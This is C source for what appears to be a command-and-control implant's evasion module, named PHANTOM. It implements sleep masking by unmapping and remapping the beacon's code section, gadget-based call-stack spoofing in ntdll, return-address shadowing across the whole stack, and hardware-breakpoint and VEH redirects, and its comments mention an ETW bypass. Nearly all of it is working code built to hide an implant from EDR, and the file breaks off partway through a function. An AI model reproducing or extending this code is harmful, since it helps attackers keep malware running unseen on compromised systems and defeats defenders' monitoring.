// ============================================================
// phantom_impl.c — PHANTOM Sleep Masking + Stack Spoofing
// P1: Section Phantom  P2: NtDelayExecution
// P3: HWBP + VEH       P4: Persistent Decoy Thread
// P5: Stack Spoofing   (gadget-pivot heap fake stack — NEW)
//
// KEY DESIGN:
//
// [P5 Stack Spoofing]
//   Problem: Direct NtDelayExecution call shows phantom_eng.exe
//            frames in the call stack (PhantomSleep, main, etc.)
//            EDR walks stack → sees unbacked module → flags.
//
//   Solution: Find "jmp [rsp+0x28]" gadget in ntdll.
//             Allocate heap fake stack with legit frames.
//             Naked asm trampoline:
//               1. Save real RSP to global
//               2. Switch RSP to fake stack (slot 0 = gadget)
//               3. Set RCX=1 (Alertable), RDX=&interval
//               4. jmp NtDelayExecution (NOT call — return addr
//                  is already on fake stack as gadget)
//
//             NtDelay runs on fake stack. When it rets:
//               - Pops gadget addr → jumps to "jmp [rsp+0x28]"
//               - Gadget reads [rsp+0x28] = continuation trampoline
//               - Jumps to continuation trampoline
//               - Trampoline restores real RSP, rets to caller
//
//   EDR stack walk during sleep:
//     ntdll!NtDelayExecution        ← RIP
//     ntdll!<jmp gadget>            ← LEGIT (slot 0)
//     <shadow space bytes>          ← NtDelay internal (slots 8-32)
//     ntdll!RtlUserThreadStart      ← LEGIT (slot 40)
//     phantom_eng.exe!spoofed_cont  ← visible but frame #5
//     kernel32!BaseThreadInitThunk  ← LEGIT (slot 56)
//
// [Thread model — P4]
//   Decoy thread created ONCE at PhantomInit, lives forever.
//   No thread churn per cycle. Uses direct NtDelayExecution
//   (no SleepEx fallback).
//
// [Section protection — P1]
//   Initial map RW → write code → unmap → remap RX.
//   No RWX ever visible. During sleep: region gone entirely.
//
// [Sleep calls — ALL replaced with direct NtDelayExecution]
//   No Sleep(), no SleepEx(), no KernelBase frames anywhere.
//   This was a major bug in original code — beacon_work(),
//   startup delay, inter-cycle pause all used Sleep().
// ============================================================

#include "phantom_core.h"
#include <stdlib.h>
#include <time.h>

// Logging silenced for framework build (OPSEC + windowed subsystem).
// Macros kept as no-ops so call sites still document the flow.
#define LOG(f,...)    ((void)0)
#define DBGL(c,f,...) ((void)0)
// P5 debug: was always-print for crash diagnosis — now silent in framework
#define P5LOG(f,...)  ((void)0)

// Global: VEH handler has no user context param — needs g_ctx
// NOT static — phantom_eng.c accesses via extern PHANTOM_CTX* g_ctx
PHANTOM_CTX* g_ctx = NULL;

// ─── P5: Globals for asm trampoline (phantom_asm.S) ──
// These are read by the asm functions via RIP-relative addressing.
// NON-STATIC: phantom_asm.S references these symbols directly.
// On PE/COFF x64, no leading underscore needed.

volatile PVOID g_savedRealRsp       = NULL;  // saved real RSP (for continuation)
volatile PVOID g_spoofGadget        = NULL;  // gadget address in ntdll
volatile PVOID g_spoofRtlUserStart  = NULL;  // ntdll!RtlUserThreadStart VA
volatile PVOID g_spoofBaseThreadInit= NULL;  // kernel32!BaseThreadInitThunk VA
volatile DWORD g_spoofGadgetOffset  = 0;     // gadget's stack offset (X in "add rsp,X")
volatile PVOID g_savedAsmRetAddr    = NULL;  // asm's own return addr (saved+restored)

// ─── P5/RAS: Return Address Shadowing globals ──
// Stack walk saves positions + original values here.
// phantom_restore_frames() (called from asm continuation) restores them.
#define MAX_SHADOWED_FRAMES 32
static struct {
    PVOID*  pos;   // position on stack (pointer to the 8-byte slot)
    PVOID   orig;  // original value (phantom_eng.exe address)
} g_shadowedFrames[MAX_SHADOWED_FRAMES];
static volatile DWORD g_shadowedCount = 0;

// ─── P6: Heap Encryption globals ──
// Simulated beacon config — would contain C2 server, keys, etc.
// Allocated on process heap so EDR heap scanner finds it.
static PVOID  g_pBeaconConfig  = NULL;
static SIZE_T g_configSize     = 4096;
static BOOL   g_heapEncrypted  = FALSE;

// ============================================================
//  API RESOLUTION
// ============================================================
BOOL phantom_resolve_apis(PHANTOM_CTX* ctx) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return FALSE;

#define RESOLVE(field, name) \
    ctx->field = (void*)GetProcAddress(ntdll, name); \
    if (!ctx->field) { LOG("[!] Missing: " name); return FALSE; }

    RESOLVE(pNtDelay,        "NtDelayExecution")
    RESOLVE(pNtCreateSec,    "NtCreateSection")
    RESOLVE(pNtMapView,      "NtMapViewOfSection")
    RESOLVE(pNtUnmapView,    "NtUnmapViewOfSection")
    RESOLVE(pNtGetCtx,       "NtGetContextThread")
    RESOLVE(pNtSetCtx,       "NtSetContextThread")
    RESOLVE(pNtCreateThread, "NtCreateThreadEx")
#undef RESOLVE

    LOG("[*] NT APIs resolved — ntdll base 0x%p", ntdll);
    return TRUE;
}

// ============================================================
//  PILLAR 1 — SECTION PHANTOM
//  (unchanged from original — P1 was working correctly)
// ============================================================

BOOL phantom_section_create(PHANTOM_CTX* ctx, PVOID code, SIZE_T sz) {
    const SIZE_T PAGE = 4096;
    SIZE_T rounded = (sz + PAGE - 1) & ~(PAGE - 1);

    LARGE_INTEGER maxSz;
    maxSz.QuadPart = (LONGLONG)rounded;

    NTSTATUS s = ctx->pNtCreateSec(
        &ctx->hSection,
        SECTION_ALL_ACCESS, NULL,
        &maxSz,
        PAGE_EXECUTE_READWRITE,  // Section capability (kernel side)
        SEC_COMMIT, NULL
    );
    if (!NT_SUCCESS(s)) { LOG("[!] NtCreateSection: 0x%08X", s); return FALSE; }

    ctx->mappedSize = rounded;

    // Step 1: Map RW (not RWX) — write code, then unmap
    PVOID rw_base = NULL;
    s = ctx->pNtMapView(
        ctx->hSection, GetCurrentProcess(),
        &rw_base, 0, 0, NULL, &ctx->mappedSize,
        ViewUnmap, 0, PAGE_READWRITE
    );
    if (!NT_SUCCESS(s)) {
        LOG("[!] NtMapView (RW init): 0x%08X", s);
        CloseHandle(ctx->hSection); ctx->hSection = NULL;
        return FALSE;
    }
    memcpy(rw_base, code, sz);
    ctx->pNtUnmapView(GetCurrentProcess(), rw_base);

    // Step 2: Remap RX — execution-ready, no write permission
    PVOID rx_base = NULL;
    s = ctx->pNtMapView(
        ctx->hSection, GetCurrentProcess(),
        &rx_base, 0, 0, NULL, &ctx->mappedSize,
        ViewUnmap, 0, PAGE_EXECUTE_READ
    );
    if (!NT_SUCCESS(s)) {
        LOG("[!] NtMapView (RX): 0x%08X", s);
        CloseHandle(ctx->hSection); ctx->hSection = NULL;
        return FALSE;
    }

    ctx->pMappedBase = rx_base;
    LOG("[P1] Section ready — beacon RX at 0x%p (%zu bytes, no RWX ever)",
        rx_base, rounded);
    return TRUE;
}

BOOL phantom_section_unmap(PHANTOM_CTX* ctx) {
    if (!ctx->pMappedBase) return TRUE;
    NTSTATUS s = ctx->pNtUnmapView(GetCurrentProcess(), ctx->pMappedBase);
    if (!NT_SUCCESS(s)) { LOG("[!] NtUnmapView: 0x%08X", s); return FALSE; }
    LOG("[P1] UNMAPPED — 0x%p gone from VA (section alive in kernel)",
        ctx->pMappedBase);
    ctx->pMappedBase = NULL;
    return TRUE;
}

BOOL phantom_section_remap(PHANTOM_CTX* ctx) {
    if (ctx->pMappedBase) return TRUE;
    if (!ctx->hSection)   return FALSE;
    PVOID base = NULL;
    NTSTATUS s = ctx->pNtMapView(
        ctx->hSection, GetCurrentProcess(),
        &base, 0, 0, NULL, &ctx->mappedSize,
        ViewUnmap, 0, PAGE_EXECUTE_READ
    );
    if (!NT_SUCCESS(s)) { LOG("[!] NtMapView (remap): 0x%08X", s); return FALSE; }
    ctx->pMappedBase = base;
    LOG("[P1] REMAPPED — beacon RX at 0x%p", base);
    return TRUE;
}

void phantom_section_destroy(PHANTOM_CTX* ctx) {
    phantom_section_unmap(ctx);
    if (ctx->hSection) { CloseHandle(ctx->hSection); ctx->hSection = NULL; }
}

// ============================================================
//  PILLAR 2 — NtDelayExecution (Direct, No Spoofing)
//
//  This is the FALLBACK path. P5 (spoofed_delay) should be
//  preferred when spoofReady == TRUE.
//
//  CRITICAL FIX: No SleepEx fallback anymore. If pNtDelay is
//  somehow NULL, we log and return — better to fail visibly
//  than to leak KernelBase!SleepEx frames.
// ============================================================

static FN_NtDelayExecution s_pNtDelay = NULL;

static FN_NtDelayExecution get_ntdelay(void) {
    if (s_pNtDelay) return s_pNtDelay;
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll)
        s_pNtDelay = (FN_NtDelayExecution)GetProcAddress(ntdll, "NtDelayExecution");
    return s_pNtDelay;
}

void phantom_ntdelay(PHANTOM_CTX* ctx, DWORD ms) {
    LARGE_INTEGER iv;
    iv.QuadPart = -(LONGLONG)ms * 10000LL;

    FN_NtDelayExecution fn = (ctx && ctx->pNtDelay) ? ctx->pNtDelay : get_ntdelay();

    if (fn) {
        fn(TRUE, &iv);   // alertable=TRUE → APC-interruptible
    } else {
        // CRITICAL: This should NEVER happen after successful resolve.
        // Do NOT fall back to SleepEx — it leaks KernelBase frames.
        // Log loudly so the user knows something is wrong.
        LOG("[!] FATAL: NtDelayExecution unresolved — sleep skipped");
    }
}

// ============================================================
//  PILLAR 5 — STACK SPOOFING (gadget-pivot heap fake stack)
//
//  This is the NEW pillar. Solves the "phantom_eng.exe frames
//  visible in call stack" problem.
//
//  Approach:
//    1. Scan ntdll executable sections for "jmp [rsp+0x28]"
//       byte pattern (FF 64 24 28). This gadget reads 8 bytes
//       from [RSP+0x28] and jumps to that address.
//
//    2. Allocate 4KB heap buffer (PAGE_READWRITE — no RWX!).
//       Pre-fill with legit-looking stack frames:
//
//       slot 0:  gadget addr (ntdll)        — NtDelay's "return"
//       slot 8:  shadow space (RCX)          — NtDelay overwrites
//       slot 16: shadow space (RDX)          — NtDelay overwrites
//       slot 24: shadow space (R8)           — NtDelay overwrites
//       slot 32: shadow space (R9)           — NtDelay overwrites
//       slot 40: RtlUserThreadStart (ntdll)  — fake legit frame
//       slot 48: continuation trampoline VA  — gadget reads this
//       slot 56: BaseThreadInitThunk (k32)   — fake legit frame
//
//    3. Naked asm trampoline (phantom_spoofed_delay_asm):
//       - Save real RSP to g_savedRealRsp (volatile global)
//       - Set RSP = fake stack slot 0 address
//       - Set RCX = 1 (Alertable), RDX = &interval
//       - jmp NtDelayExecution (NOT call — return addr is
//         already placed at slot 0)
//
//    4. NtDelayExecution runs on fake stack.
//       When it rets: pops gadget addr → jmp [rsp+0x28]
//       → reads slot 48 = continuation trampoline → jumps there
//
//    5. Continuation trampoline (phantom_spoofed_continue):
//       - Restore RSP = g_savedRealRsp
//       - ret → returns to original caller (PhantomSleep)
//
//  EDR stack walk during sleep:
//    ntdll!NtDelayExecution
//    ntdll!<jmp gadget>           ← LEGIT ntdll address
//    <shadow space — random>      ← looks like ntdll internal
//    ntdll!RtlUserThreadStart     ← LEGIT
//    phantom_eng.exe!spoofed_cont ← frame #5 (deep, often missed)
//    kernel32!BaseThreadInitThunk ← LEGIT
// ============================================================

// ─── Gadget Scanner ──────────────────────────────────
// Scans ntdll executable sections for byte pattern.
// Only scans sections with IMAGE_SCN_MEM_EXECUTE flag —
// avoids false positives in data sections.
static PVOID scan_module_for_bytes(HMODULE hMod, const BYTE* pattern, SIZE_T patLen) {
    if (!hMod || !pattern || patLen == 0) return NULL;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PUCHAR)hMod + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        // Only scan executable sections
        if (!(sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;

        PUCHAR base = (PUCHAR)hMod + sec[i].VirtualAddress;
        SIZE_T size = sec[i].Misc.VirtualSize;

        for (SIZE_T j = 0; j < size - patLen; j++) {
            if (memcmp(base + j, pattern, patLen) == 0) {
                return base + j;
            }
        }
    }
    return NULL;
}

// ─── P5: Assembly Trampolines (phantom_asm.S) ────────
// v2: REAL STACK approach — no stack pivot, no fake stack.
// Pushes fake frames onto the real stack, overwrites NtDelay's
// return address with a gadget.
//
// phantom_spoofed_delay_asm(pNtDelay, pIv):
//   RCX = pNtDelay (NtDelayExecution address)
//   RDX = pIv     (pointer to LARGE_INTEGER interval)
//   Uses globals: g_spoofGadget, g_spoofRtlUserStart,
//                 g_spoofBaseThreadInit, g_spoofGadgetOffset
//
// phantom_spoofed_continue():
//   Restores real RSP, rets to original caller.
extern void phantom_spoofed_delay_asm(
    PVOID pNtDelay, LARGE_INTEGER* pIv);
extern void phantom_spoofed_continue(void);

// ─── P5 Init: Find gadget + resolve legit addrs + alloc fake stack ──
//
// Gadget Search Strategy (tries multiple patterns):
//
// TYPE 0 — "jmp [rsp+X]" (single instruction, 4 bytes)
//   FF 64 24 28  →  jmp [rsp+0x28]  (cont at slot 48)
//   FF 64 24 30  →  jmp [rsp+0x30]  (cont at slot 56)
//   FF 64 24 20  →  jmp [rsp+0x20]  (cont at slot 40)
//   FF 64 24 38  →  jmp [rsp+0x38]  (cont at slot 64)
//   FF 64 24 40  →  jmp [rsp+0x40]  (cont at slot 72)
//
// TYPE 1 — "add rsp, X; ret" (two instructions, 5 bytes)
//   48 83 C4 28 C3  →  add rsp,0x28; ret  (cont at slot 48)
//   48 83 C4 30 C3  →  add rsp,0x30; ret  (cont at slot 56)
//   48 83 C4 20 C3  →  add rsp,0x20; ret  (cont at slot 40)
//   48 83 C4 38 C3  →  add rsp,0x38; ret  (cont at slot 64)
//   48 83 C4 40 C3  →  add rsp,0x40; ret  (cont at slot 72)
//
// Both types have SAME effect: continuation goes at slot (8 + X).
// Type 1 is MUCH more common — function epilogues use it everywhere.
BOOL phantom_init_spoof(PHANTOM_CTX* ctx) {
    if (!ctx) return FALSE;

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    HMODULE k32   = GetModuleHandleA("kernel32.dll");
    if (!ntdll || !k32) {
        LOG("[P5] Cannot get module handles");
        return FALSE;
    }

    // Resolve legit addresses for fake frames
    ctx->pRtlUserThreadStart  = (PVOID)GetProcAddress(ntdll, "RtlUserThreadStart");
    ctx->pBaseThreadInitThunk = (PVOID)GetProcAddress(k32, "BaseThreadInitThunk");
    ctx->pRtlExitUserThread   = (PVOID)GetProcAddress(ntdll, "RtlExitUserThread");

    if (!ctx->pRtlUserThreadStart || !ctx->pBaseThreadInitThunk) {
        LOG("[P5] Cannot resolve RtlUserThreadStart / BaseThreadInitThunk");
        return FALSE;
    }

    PVOID gadget = NULL;
    DWORD gadgetType = 0;
    DWORD gadgetOffset = 0;

    // ── Try TYPE 0: jmp [rsp+X] patterns (4 bytes each) ──
    struct { BYTE pat[4]; DWORD off; } jmp_patterns[] = {
        { { 0xFF, 0x64, 0x24, 0x28 }, 0x28 },  // jmp [rsp+0x28]
        { { 0xFF, 0x64, 0x24, 0x30 }, 0x30 },  // jmp [rsp+0x30]
        { { 0xFF, 0x64, 0x24, 0x20 }, 0x20 },  // jmp [rsp+0x20]
        { { 0xFF, 0x64, 0x24, 0x38 }, 0x38 },  // jmp [rsp+0x38]
        { { 0xFF, 0x64, 0x24, 0x40 }, 0x40 },  // jmp [rsp+0x40]
    };
    for (int i = 0; i < 5 && !gadget; i++) {
        gadget = scan_module_for_bytes(ntdll, jmp_patterns[i].pat, 4);
        if (gadget) {
            gadgetType = 0;
            gadgetOffset = jmp_patterns[i].off;
        }
    }

    // ── Try TYPE 1: add rsp, X; ret patterns (5 bytes each) ──
    // VERY common in function epilogues — almost guaranteed to find one.
    struct { BYTE pat[5]; DWORD off; } add_patterns[] = {
        { { 0x48, 0x83, 0xC4, 0x28, 0xC3 }, 0x28 },  // add rsp,0x28; ret
        { { 0x48, 0x83, 0xC4, 0x30, 0xC3 }, 0x30 },  // add rsp,0x30; ret
        { { 0x48, 0x83, 0xC4, 0x20, 0xC3 }, 0x20 },  // add rsp,0x20; ret
        { { 0x48, 0x83, 0xC4, 0x38, 0xC3 }, 0x38 },  // add rsp,0x38; ret
        { { 0x48, 0x83, 0xC4, 0x40, 0xC3 }, 0x40 },  // add rsp,0x40; ret
        { { 0x48, 0x83, 0xC4, 0x18, 0xC3 }, 0x18 },  // add rsp,0x18; ret
        { { 0x48, 0x83, 0xC4, 0x10, 0xC3 }, 0x10 },  // add rsp,0x10; ret
        { { 0x48, 0x83, 0xC4, 0x08, 0xC3 }, 0x08 },  // add rsp,0x08; ret
    };
    for (int i = 0; i < 8 && !gadget; i++) {
        gadget = scan_module_for_bytes(ntdll, add_patterns[i].pat, 5);
        if (gadget) {
            gadgetType = 1;
            gadgetOffset = add_patterns[i].off;
        }
    }

    if (!gadget) {
        LOG("[P5] No suitable gadget found in ntdll — spoofing disabled");
        LOG("[P5] Tried: jmp[rsp+X] (5 variants) + add rsp,X;ret (8 variants)");
        ctx->spoofReady = FALSE;
        return FALSE;
    }

    ctx->pJmpRspGadget = gadget;
    ctx->gadgetType    = gadgetType;
    ctx->gadgetOffset  = gadgetOffset;

    // ── Set globals for asm trampoline ──
    // These are read by phantom_spoofed_delay_asm via RIP-relative addressing
    g_spoofGadget         = gadget;
    g_spoofRtlUserStart   = ctx->pRtlUserThreadStart;
    g_spoofBaseThreadInit = ctx->pBaseThreadInitThunk;
    g_spoofGadgetOffset   = gadgetOffset;

    LOG("[P5] Gadget found: %s @ ntdll+0x%p (VA 0x%p)",
        gadgetType == 0 ? "jmp [rsp+X]" : "add rsp,X; ret",
        (PUCHAR)gadget - (PUCHAR)ntdll, gadget);
    LOG("[P5]   offset=0x%02X → continuation at slot %u",
        gadgetOffset, 8 + gadgetOffset);

    // v2: NO fake stack allocation needed!
    // We push fake frames onto the REAL stack inside the asm trampoline.
    // This avoids kernel stack validation issues (pivot crash fix).

    ctx->spoofReady = TRUE;
    LOG("[P5] Stack spoofing READY — v2 real-stack approach (no pivot)");
    LOG("[P5]   RtlUserThreadStart  = 0x%p", ctx->pRtlUserThreadStart);
    LOG("[P5]   BaseThreadInitThunk = 0x%p", ctx->pBaseThreadInitThunk);
    LOG("[P5]   continuation        = 0x%p", (PVOID)phantom_spoofed_continue);
    return TRUE;
}

// ─── P5 Destroy: Cleanup (v2 — no fake stack to free) ──
void phantom_destroy_spoof(PHANTOM_CTX* ctx) {
    if (!ctx) return;
    // Clear globals
    g_spoofGadget         = NULL;
    g_spoofRtlUserStart   = NULL;
    g_spoofBaseThreadInit = NULL;
    g_spoofGadgetOffset   = 0;
    ctx->pJmpRspGadget = NULL;
    ctx->spoofReady = FALSE;
    LOG("[P5] Spoofing destroyed");
}

// ─── P5/RAS: phantom_restore_frames ───────────────────
// Called from asm (phantom_spoofed_continue) after NtDelay returns.
// Restores all shadowed return addresses to their original values.
// This is critical — without this, code would return to wrong addresses
// after sleep and crash.
//
// This function is called from asm with proper shadow space allocated.
// It must be simple — no complex operations, just memory writes.
void phantom_restore_frames(void) {
    DWORD count = g_shadowedCount;
    for (DWORD i = 0; i < count; i++) {
        if (g_shadowedFrames[i].pos) {
            *(g_shadowedFrames[i].pos) = g_shadowedFrames[i].orig;
            g_shadowedFrames[i].pos = NULL;
        }
    }
    g_shadowedCount = 0;

    // Restore asm's own return address (replaced by asm trampoline)
    // g_savedRealRsp points to [asm_ret_addr position] on stack
    // g_savedAsmRetAddr holds the original value
    if (g_savedAsmRetAddr && g_savedRealRsp) {
        *(PVOID*)g_savedRealRsp = g_savedAsmRetAddr;
        g_savedAsmRetAddr = NULL;
    }
}

// ─── P5/RAS: Stack bounds helper ──────────────────────
// Reads StackBase and StackLimit from TEB via GS segment (x64).
// This tells us the valid committed stack range — we must NEVER
// read outside this range or we hit the guard page → ACCESS VIOLATION.
static inline PUCHAR phantom_get_stack_base(void) {
    return (PUCHAR)__readgsqword(0x08);   // TEB+0x08 = StackBase (highest addr)
}
static inline PUCHAR phantom_get_stack_limit(void) {
    return (PUCHAR)__readgsqword(0x10);   // TEB+0x10 = StackLimit (lowest committed)
}

// ─── P5/RAS: phantom_walk_and_shadow ──────────────────
// NOVEL FIX v5: Hybrid approach — backtrace + full linear scan.
//
// GOAL: Replace ALL phantom_eng return addresses, including deep frames.
//
// ROOT CAUSE OF FRAME 6/20/21 MISSING:
//   - v4 only checked .text section
//   - MinGW puts CRT code in OTHER sections (.rdata, CRT sections)
//   - Addresses 0xd050, 0xd867 were outside .text → not recognized
//
// THIS FIX (v5):
//   1. Use MODULE RANGE (base to base+SizeOfImage) — catches ALL sections
//   2. RtlCaptureStackBackTrace to get our own 2 return addrs (to skip)
//   3. FULL LINEAR SCAN from our position to StackBase
//   4. Replace ANY value in module range (except our own return addrs)
//
// Why linear scan is SAFE now:
//   - We skip our own return addresses (can't corrupt return path)
//   - Any DATA values replaced are restored after sleep by restore_frames
//   - During sleep, beacon isn't executing → doesn't read that data
//   - Decoy has its own stack → no interference
__attribute__((noinline))
static void phantom_walk_and_shadow(PHANTOM_CTX* ctx) {
    // Get phantom_eng.exe FULL MODULE range (not just .text!)
    HMODULE hExe = GetModuleHandleA(NULL);
    if (!hExe) return;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hExe;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PUCHAR)hExe + dos->e_lfanew);

    // Module range = base to base + SizeOfImage (covers ALL sections)
    PUCHAR moduleStart = (PUCHAR)hExe;
    PUCHAR moduleEnd   = (PUCHAR)hExe + nt->OptionalHeader.SizeOfImage;

    P5LOG("RAS: module range 0x%p to 0x%p (%zuKB)",
         moduleStart, moduleEnd,
         (nt->OptionalHeader.SizeOfImage) / 1024);

    // ── Get our own 2 return addresses to SKIP ──
    // frames[0] = phantom_walk_and_shadow's return addr
    // frames[1] = phantom_spoofed_delay's return addr
    // These MUST stay intact — replacing them = crash on return
    PVOID skipAddrs[2];
    RtlCaptureStackBackTrace(0, 2, skipAddrs, NULL);
    PVOID skipAddr0 = skipAddrs[0];
    PVOID skipAddr1 = skipAddrs[1];

    P5LOG("RAS: skipAddr0=0x%p skipAddr1=0x%p", skipAddr0, skipAddr1);

    // ── Get stack bounds from TEB ──
    PUCHAR stackBase  = phantom_get_stack_base();
    PUCHAR stackLimit = phantom_get_stack_limit();

    P5LOG("RAS: stack base=0x%p limit=0x%p (%zuKB)",
         stackBase, stackLimit, (stackBase - stackLimit) / 1024);

    // ── Full linear scan: from above our locals to StackBase ──
    volatile char stackMarker;
    PUCHAR scanStart = (PUCHAR)&stackMarker + 128;
    scanStart = (PUCHAR)((ULONG_PTR)scanStart & ~7ULL);  // align to 8
    PUCHAR scanEnd = stackBase;  // ENTIRE stack up to base!

    P5LOG("RAS: scanning 0x%p to 0x%p (%zu bytes)",
         scanStart, scanEnd, scanEnd - scanStart);

    DWORD replaced = 0;
    PVOID replaceWith = ctx->pRtlUserThreadStart;

    for (PUCHAR p = scanStart; p < scanEnd && replaced < MAX_SHADOWED_FRAMES; p += 8) {
        PVOID val = *(PVOID*)p;

        // Skip our own return addresses — CRITICAL for safe return
        if (val == skipAddr0 || val == skipAddr1) {
            P5LOG("RAS: skip own ret 0x%p @ 0x%p", val, p);
            continue;
        }

        // Check if value is ANYWHERE in phantom_eng.exe module
        // (not just .text — catches CRT code in other sections too)
        if ((PUCHAR)val >= moduleStart && (PUCHAR)val < moduleEnd) {
            // Found a phantom_eng.exe address — shadow it!
            g_shadowedFrames[replaced].pos  = (PVOID*)p;
            g_shadowedFrames[replaced].orig = val;
            *(PVOID*)p = replaceWith;
            replaced++;

            P5LOG("RAS: shadowed frame %u — 0x%p → 0x%p @ stack 0x%p",
                 replaced - 1, val, replaceWith, p);
        }
    }

    g_shadowedCount = replaced;
    P5LOG("RAS: shadowed %u phantom_eng frames total (full module scan)", replaced);
}

// ─── P5 Spoofed Delay: Public entry point (v4 — RAS) ──
// NOVEL: Return Address Shadowing (RAS)
//   1. Walk real stack, replace all phantom_eng return addresses
//   2. Push fake ntdll frames on top
//   3. Call NtDelay (EDR sees only ntdll/kernel32 frames)
//   4. After sleep, restore all shadowed addresses
//   5. Return to original caller
//
// This hides BOTH top frames AND deep frames — unlike v3 which only
// hid top 3-4 frames. RAS walks the entire stack and replaces every
// phantom_eng.exe address it finds.
//
// __attribute__((noinline)) prevents GCC from inlining this into
// PhantomSleep, which would break the stack walk assumptions.
__attribute__((noinline))
void phantom_spoofed_delay(PHANTOM_CTX* ctx, DWORD ms) {
    if (!ctx || !ctx->spoofReady || !ctx->pJmpRspGadget || !ctx->pNtDelay) {
        // Fallback: direct NtDelay (no spoofing, but no SleepEx either)
        phantom_ntdelay(ctx, ms);
        return;
    }

    LARGE_INTEGER iv;
    iv.QuadPart = -(LONGLONG)ms * 10000LL;

    P5LOG("=== Spoofed delay v7 (RAS + P7 HWBP) — %ums ===", ms);

    // ── RAS: Walk stack and shadow phantom_eng return addresses ──
    phantom_walk_and_shadow(ctx);

    // ── P7: Arm HWBP DR1 on ntdll!RtlUserThreadStart ──
    // When gadget rets to slot 48 (ntdll addr), HWBP fires.
    // VEH handler redirects execution to real caller.
    // This hides frame 2 (continuation) — ZERO phantom_eng frames!
    if (!phantom_p7_arm_hwbp(ctx, ctx->pRtlUserThreadStart)) {
        P5LOG("[P7] HWBP arm FAILED — fallback to v6 (1 frame visible)");
        // Slot 48 still has ntdll addr, but HWBP won't fire.
        // phantom_spoofed_continue (dead code) won't be reached either.
        // If HWBP doesn't fire, ntdll!RtlUserThreadStart executes → crash.
        // So we MUST abort and use direct NtDelay.
        phantom_restore_frames();  // undo RAS
        phantom_ntdelay(ctx, ms);
        return;
    }

    P5LOG("[P7] HWBP DR1 armed — slot 48 = ntdll!RtlUserThreadStart");
    P5LOG("ASM call — pNtDelay=0x%p &iv=0x%p", ctx->pNtDelay, &iv);

    // Invoke the asm trampoline.
    // Control flow: asm → NtDelay → gadget → ntdll!RtlUserThreadStart
    //   → HWBP DR1 fires → VEH → redirect → here
    phantom_spoofed_delay_asm(ctx->pNtDelay, &iv);

    // Control reaches here after P7 VEH handler redirects execution.
    // HWBP fired → VEH restored frames → set RIP=caller → resumed here.
    P5LOG("[P7] HWBP redirect complete — execution resumed");
}

// ============================================================
//  PILLAR 3 + P7 — HWBP + VEH
//
//  P3 (DR0): HWBP on phantom_timer_apc — APC wake mechanism
//  P7 (DR1): HWBP on ntdll!RtlUserThreadStart — continuation redirect
//
//  VEH handler checks Dr6 to distinguish:
//    Dr6 & 0x1 → DR0 fired (P3 APC wake)
//    Dr6 & 0x2 → DR1 fired (P7 continuation redirect)
// ============================================================
LONG WINAPI phantom_veh(PEXCEPTION_POINTERS ep) {
    if (!ep || !ep->ExceptionRecord) return EXCEPTION_CONTINUE_SEARCH;
    if (ep->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    CONTEXT* ctx = ep->ContextRecord;

    // ── P3: DR0 — APC wake (HWBP on phantom_timer_apc) ──
    if (ctx->Dr6 & 0x1) {
        ctx->Dr0 = 0;
        ctx->Dr6 = 0;
        ctx->Dr7 &= ~(DWORD64)0x1;  // Clear L0

        if (g_ctx && g_ctx->hWakeEvent)
            SetEvent(g_ctx->hWakeEvent);

        return EXCEPTION_CONTINUE_EXECUTION;
    }

    // ── P7: DR1 — Continuation redirect (HWBP on ntdll!RtlUserThreadStart) ──
    // This fires when gadget rets to slot 48 (ntdll addr).
    // We redirect execution to the real caller (phantom_spoofed_delay's caller).
    //
    // STABILITY NOTE (audit I-CR1 fix REVERTED):
    //   The audit recommended re-arming DR1 with EtwEventWrite here to
    //   preserve the ETW HWBP bypass after P7 fires. However, testing showed
    //   this caused high CPU usage during the awake period — Windows calls
    //   EtwEventWrite thousands of times per second, and each call triggered
    //   the VEH handler (exception → kernel transition → handler → resume),
    //   saturating the CPU and eventually causing the agent to exit.
    //
    //   Reverted to the original "clear DR1" behavior. This means ETW bypass
    //   is silently defeated after the first sleep cycle (the audit's
    //   I-CR1 finding stands as a known limitation). A smarter fix that
    //   limits ETW interception to specific threads (or uses a different
    //   bypass mechanism) is deferred to a future iteration.
    //
    //   The etw_get_dr1_target() helper in etw.c is kept for future use
    //   but currently has no caller.
    if (ctx->Dr6 & 0x2) {
        // Only handle if we're in P7 flow (g_savedRealRsp is set)
        if (g_savedRealRsp) {
            // 1. Restore all shadowed frames (RAS + asm ret addr)
            // phantom_restore_frames writes back original values
            phantom_restore_frames();

            // 2. After restore, [g_savedRealRsp] = original return address
            //    Set RIP = that address (resume at caller)
            ctx->Rip = *(DWORD64*)g_savedRealRsp;

            // 3. Set RSP = g_savedRealRsp + 8 (simulate ret — pop return addr)
            ctx->Rsp = (DWORD64)g_savedRealRsp + 8;

            // 4. Clear DR1 (one-shot — don't fire again)
            ctx->Dr1 = 0;
            ctx->Dr6 = 0;
            ctx->Dr7 &= ~(DWORD64)(0x1 << 2);  // Clear L1

            // 5. Clear saved state (one-shot)
            g_savedRealRsp = NULL;

            return EXCEPTION_CONTINUE_EXECUTION;
        }
        // If g_savedRealRsp is NULL, this is NOT our HWBP — pass it on
        // (could be a debugger's HWBP or other exception)
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

BOOL phantom_hwbp_arm(PHANTOM_CTX* ctx, PVOID addr) {
    if (!ctx->pNtGetCtx || !ctx->pNtSetCtx || !addr) return FALSE;
    CONTEXT c = {0};
    c.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (!NT_SUCCESS(ctx->pNtGetCtx(GetCurrentThread(), &c))) return FALSE;
    c.Dr0 = (DWORD64)addr;
    c.Dr7 |= 0x1;
    c.Dr7 &= ~(DWORD64)(0xF << 16);
